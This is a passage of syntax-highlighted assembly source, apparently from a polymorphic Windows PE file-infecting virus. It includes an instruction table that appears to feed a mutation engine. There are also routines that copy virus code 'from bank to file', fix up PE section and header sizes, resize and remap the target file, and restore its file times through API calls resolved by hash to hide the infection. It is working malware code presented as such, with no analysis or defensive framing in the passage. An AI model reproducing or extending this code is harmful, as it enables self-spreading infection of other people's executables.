 </span><span class="sc5">instruction</span><span class="sc0">  </span><span class="sc6">SLDT</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">SMSW</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000100100000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">STR</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000000001000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">VERR</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000000100000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">VERW</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000000101000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction</span><span class="sc0">  </span><span class="sc5">SETcc</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem8</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1001000000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0"> 
 </span><span class="sc5">instruction</span><span class="sc0">  </span><span class="sc6">INVLPG</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000100111000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction</span><span class="sc0">  </span><span class="sc5">CMOVcc</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100000000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">updatecode</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">getval</span><span class="sc0">  </span><span class="sc5">virusbank</span><span class="sc0">           

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">ISyscall</span><span class="sc0">    </span><span class="sc5">LoadBankInfoIt</span><span class="sc0">          </span><span class="sc1">; Should be a system call</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">getval</span><span class="sc0">  </span><span class="sc5">valuefill</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">I_Init</span><span class="sc4">-</span><span class="sc5">InfectStart</span><span class="sc0">    </span><span class="sc1">; set the image</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">               
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">I_Fini</span><span class="sc4">-</span><span class="sc5">InfectStart</span><span class="sc0">

</span><span class="sc5">getval</span><span class="sc0">      </span><span class="sc5">virsize</span><span class="sc0">         </span><span class="sc1">; set virus size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">getval</span><span class="sc0">      </span><span class="sc5">dropplace</span><span class="sc0">       </span><span class="sc1">; and drop place</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">244</span><span class="sc0">

</span><span class="sc5">getseedvalue</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">getseedvalue</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">ISyscall</span><span class="sc0">    </span><span class="sc5">PolyMorphising</span><span class="sc0">      </span><span class="sc1">; pass all that to the polymorphic</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">repz</span><span class="sc0">        </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; repz from bank to file</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; put here how the file should be updated</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">RVA2Offset</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">getnextone</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">getnext</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">getnext</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">getnext</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getnextone</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">RebuildLoaded</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">thatgatat</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">dontaddcodedata</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">dontaddcodedata</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">dontaddinitdata</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">dontaddinitdata</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">dontadduninitdata</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">dontadduninitdata</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">thatgatat</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">goaway5</span><span class="sc4">:</span><span class="sc0">
 
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                 
</span><span class="sc5">I_apicall</span><span class="sc0">    </span><span class="sc2">03D60E5B1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; UnmapViewOfFile               </span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">    </span><span class="sc2">0F8F846CCh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; CloseHandle               </span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                 
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+(</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">    </span><span class="sc2">03508B12Bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; SetFileTime</span><span class="sc0">

</span><span class="sc5">I_apicall</span><span class="sc0">    </span><span class="sc2">0F8F846CCh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; CloseHandle               </span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wefinished</span><span class="sc0">

</span><span class="sc5">ResizeAndRemap</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc5">gogetagain</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gogetagain</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gogetagain</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">    </span><span class="sc2">03D60E5B1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; UnmapViewOfFile               </span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; save the handles</span><span class="sc0">
